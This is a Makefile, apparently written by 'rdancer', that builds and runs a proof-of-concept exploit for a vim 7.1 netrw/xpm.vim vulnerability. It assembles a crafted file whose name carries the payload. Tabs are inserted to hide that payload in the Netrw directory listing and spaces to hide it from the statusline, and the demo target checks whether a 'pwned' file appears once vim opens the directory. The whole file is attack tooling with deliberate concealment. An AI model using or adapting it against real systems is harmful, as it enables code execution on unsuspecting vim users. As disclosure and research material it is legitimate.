# Makefile for rdancer's exploit of the vim 7.1 xpm.vim vulnerability
#
# Usage {{{1
#
# Some interesting targets:
#
#	(1) make sploit
#
#	    Compiles the exploit.
#
#	(2) make demo
#
#	    ``demo'' is the default target.  Compile and run the exploit.
#
#	(3) make test
#	
#	    Compile and run exploit non-interactively.

# Variables {{{1
#
# Leading dot-slash, so that the messages look like a path, not multiple option
# ("./sploit/pwned" vs. "sploit/pwned")
EXPLOIT_DIR = "./sploit"
EXPLOIT_NAME_IN = exploit_name
# (1) Leading TABs hide the payload in the Netrw directory listing.
# (2) Trailing SPACEs hide the payload from the statusline once opened.
# Note: Filename might be too long -- we disable (2) by default.
EXPLOIT_ROOT ?= "pi_netrw.txt$(shell \
			perl -e 'print "\t" x 20'; \
			tail -n1 -- $(EXPLOIT_NAME_IN); \
			: perl -e 'print " " x 100' \
		).gz"
# FIXME: Writing ESC as '\033' doesn't work
EXPLOIT_ROOT_LOOKFOR ?= "^$(shell printf %s $(EXPLOIT_ROOT) \
		| sed 's/[^a-zA-Z0-9]/./g')"
EXPLOIT ?= $(EXPLOIT_DIR)/$(EXPLOIT_ROOT)
EXPLOIT_LINK = exploit

# Be very verbose -- use for debugging
#VIM_OPTIONS := -V16

# This is the name of the file created by the exploit
PWN_FILE = "pwned"

#
# Targets {{{1
#
# demo -- Run the exploit {{{2
.PHONY: demo
demo: sploit
	rm -f -- $(PWN_FILE)
	vim $(VIM_OPTIONS) -- $(EXPLOIT_DIR)
	@if test -f $(PWN_FILE); then \
		echo "Exploit worked -- see the \`\`"$(PWN_FILE)"'' file."; \
	else \
		echo "Exploit didn't work."; \
		exit 1; \
	fi

# test -- Test whether the exploit works {{{2
.PHONY: test
test: VIM_OPTIONS := ${VIM_OPTIONS} +/$(EXPLOIT_ROOT_LOOKFOR) +':execute "normal \<cr>"' +:q
test: demo

# sploit -- Compile the exploit {{{2
.PHONY: sploit
sploit: exploit.vim
	# Start with empty exploit dir -- so that following works for sure:
	# (1) the ``test'' target search for wildcarded regexp
	# (2) the exploit's ``edit %*''
	rm -rf -- $(EXPLOIT_DIR)
	mkdir -p -- $(EXPLOIT_DIR)
	{ \
		sed "s#PWN_FILE#"$(PWN_FILE)"#g"; \
	} < exploit.vim     >> $(EXPLOIT) 
	echo 'CUT_HERE'     >> $(EXPLOIT)
	cat pi_netrw.txt    >> $(EXPLOIT)
	ln -fs -- $(EXPLOIT) $(EXPLOIT_LINK)

# all -- Make all exploit flavours and extensions {{{2
# We only have one flavour at the moment
all: sploit

# clean -- Remove files we can remake {{{2
.PHONY: clean
clean:
	 rm -f -- $(EXPLOIT) $(PWN_FILE) $(EXPLOIT_LINK)
  
# mrproper -- Make sure we're clean {{{2
.PHONY: mrproper
mrproper: clean
	rm -rf -- $(EXPLOIT_DIR)
	mkdir -p -- $(EXPLOIT_DIR)
  
# dist -- Make a distribution tarball {{{2
.PHONY: dist
dist: mrproper all clean
	make -C .. `pwd | sed 's@.*/@@'`.tar.bz2

#
# Modeline {{{1
#
# vim: foldmethod=marker :
